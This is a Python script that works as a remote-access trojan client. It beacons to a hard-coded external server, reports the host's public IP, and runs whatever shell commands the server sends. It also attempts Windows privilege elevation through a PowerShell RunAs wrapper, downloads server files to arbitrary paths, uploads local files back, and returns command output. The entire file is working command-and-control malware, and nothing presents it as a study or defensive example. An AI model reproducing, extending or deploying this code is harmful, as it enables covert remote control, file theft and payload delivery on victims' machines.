import requests
import time
import subprocess
import json
import uuid 
import sys
import os

# --- Configuration ---
# !!! REMEMBER TO UPDATE THIS TO YOUR LIVE SERVER URL !!!
SERVER = "https://server3-atm9.onrender.com/"
CLIENT_ID_FILE = "client_id.json"
POLL_INTERVAL_SECONDS = 5
MAX_EXECUTION_TIMEOUT = 30 
DOWNLOAD_DIR = "client_downloads" # Default directory for downloads

# Ensure download directory exists
os.makedirs(DOWNLOAD_DIR, exist_ok=True)

# ------------------ FILE HANDLING FUNCTIONS ------------------ #

def handle_download(filename, target_local_path=None):
    """
    Downloads a file from the server's /download_file endpoint.
    If target_local_path is specified, it saves there; otherwise, it defaults 
    to the DOWNLOAD_DIR.
    """
    url = f"{SERVER}/download_file/{filename}"
    
    # 1. Determine the final save path
    if target_local_path:
        local_path = target_local_path
        # Ensure the directory exists if the target path includes a directory
        os.makedirs(os.path.dirname(local_path) or '.', exist_ok=True)
    else:
        # Default save location
        local_path = os.path.join(DOWNLOAD_DIR, os.path.basename(filename))
        
    try:
        print(f"Attempting to download {filename} to: {local_path}")
        response = requests.get(url, stream=True, timeout=300) 
        response.raise_for_status() 
        
        with open(local_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        return f"Successfully downloaded file to: {local_path}"
    except requests.exceptions.RequestException as e:
        return f"DOWNLOAD FAILED. Network or Server Error: {e}"
    except Exception as e:
        return f"DOWNLOAD FAILED. File System Error or Invalid Path: {e}"

def handle_upload(local_path):
    """Uploads a file from the client to the server's /upload_file endpoint."""
    if not os.path.exists(local_path):
        return f"UPLOAD FAILED. Local file not found: {local_path}"

    url = f"{SERVER}/upload_file"
    
    try:
        print(f"Attempting to upload: {local_path}")
        with open(local_path, 'rb') as f:
            files = {'file': (os.path.basename(local_path), f)}
            data = {'client_id': CLIENT_ID}
            response = requests.post(url, files=files, data=data, timeout=300)

        response.raise_for_status()
        return f"Successfully uploaded file. Server response: {response.json().get('message', 'No message')}"
        
    except requests.exceptions.RequestException as e:
        return f"UPLOAD FAILED. Network or Server Error: {e}"
    except Exception as e:
        return f"UPLOAD FAILED. General Error: {e}"


# ------------------ Utility Functions (IP/ID) ------------------ #
def get_public_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=5).text
    except Exception:
        return "0.0.0.0"

def get_unique_client_id():
    """Loads a unique ID from a local file, or generates and saves a new one."""
    try:
        with open(CLIENT_ID_FILE, "r") as f:
            return json.load(f)["client_id"]
    except (FileNotFoundError, json.JSONDecodeError):
        new_id = str(uuid.uuid4())
        try:
            with open(CLIENT_ID_FILE, "w") as f:
                json.dump({"client_id": new_id}, f)
            return new_id
        except Exception:
            return new_id 

# ------------------ Main Execution Block ------------------ #
try:
    CLIENT_ID = get_unique_client_id()
    print("-" * 50)
    print(f"Client Process Starting. ID: {CLIENT_ID}")
    print("-" * 50)
except Exception as e:
    print(f"FATAL SETUP ERROR: {e}. Exiting.")
    sys.exit(1)


while True:
    try:
        # 1) SEND IP TO SERVER (Heartbeat)
        ip = get_public_ip()
        requests.post(f"{SERVER}/update_ip", json={"ip": ip, "client_id": CLIENT_ID}, timeout=5)

        # 2) CHECK IF SERVER HAS COMMAND
        cmd_res = requests.get(f"{SERVER}/get_cmd?client_id={CLIENT_ID}", timeout=5).json()
        command = cmd_res.get("cmd", "").strip()
        
        if command:
            
            # --- ADMIN CMD LOGIC (Windows Elevation Attempt) ---
            if command.upper().startswith("ADMIN_CMD:"):
                shell_command = command[10:].strip()
                
                # Command wrapper using PowerShell to attempt elevation
                # This opens a new CMD window with elevated rights to run the command.
                wrapped_command = f'powershell -Command "Start-Process cmd -ArgumentList \'/c {shell_command}\' -Verb RunAs"'
                
                print(f"[{CLIENT_ID}] **ADMIN COMMAND RECEIVED:** {shell_command}")
                try:
                    # Execute the wrapper command
                    output = subprocess.check_output(wrapped_command, shell=True, stderr=subprocess.STDOUT, text=True, timeout=MAX_EXECUTION_TIMEOUT)
                except subprocess.CalledProcessError as e:
                    output = f"Admin Command Failed (Exit Code {e.returncode}):\n{e.output}\n\nNOTE: If UAC is enabled, this will time out or fail. The client must be launched as Admin for reliable execution."
                except subprocess.TimeoutExpired:
                     output = f"Admin Command execution timed out ({MAX_EXECUTION_TIMEOUT}s). **Likely blocked by UAC prompt on the client desktop.**"
                except Exception as e:
                    output = f"Execution Error: {str(e)}"

            # --- FILE TRANSFER LOGIC ---
            elif command.upper().startswith("DOWNLOAD:"):
                # Expected format: DOWNLOAD:server_filename [target_local_path]
                parts = command[9:].strip().split(maxsplit=1)
                
                if not parts:
                    output = "DOWNLOAD FAILED. Usage: DOWNLOAD:server_filename [target_path]"
                else:
                    filename = parts[0]
                    target_path = parts[1] if len(parts) > 1 else None
                    output = handle_download(filename, target_path)
            
            elif command.upper().startswith("UPLOAD:"):
                local_path = command[7:].strip()
                output = handle_upload(local_path)
            
            # --- SHELL EXECUTION LOGIC (Standard User) ---
            else:
                print(f"[{CLIENT_ID}] **COMMAND RECEIVED:** {command}")
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True, timeout=MAX_EXECUTION_TIMEOUT)
                except subprocess.CalledProcessError as e:
                    output = f"Command Failed (Exit Code {e.returncode}):\n{e.output}"
                except subprocess.TimeoutExpired:
                     output = f"Command execution timed out ({MAX_EXECUTION_TIMEOUT}s)."
                except Exception as e:
                    output = f"Execution Error: {str(e)}"

            # 4) SEND OUTPUT BACK TO SERVER
            requests.post(f"{SERVER}/send_output", json={"output": output, "client_id": CLIENT_ID}, timeout=10)
            
            # 5) CLEAR COMMAND ON SERVER
            requests.post(f"{SERVER}/set_cmd", json={"cmd": "", "client_id": CLIENT_ID}, timeout=10)
            print(f"[{CLIENT_ID}] Finished processing command. Output sent: {output[:50]}...")

    except requests.exceptions.RequestException as req_err:
        print(f"[{CLIENT_ID}] NETWORK ERROR: {req_err}. Retrying in {POLL_INTERVAL_SECONDS}s.")
        
    except Exception as e:
        print(f"[{CLIENT_ID}] UNEXPECTED LOOP ERROR: {e}. Retrying in {POLL_INTERVAL_SECONDS}s.")
        
    time.sleep(POLL_INTERVAL_SECONDS)
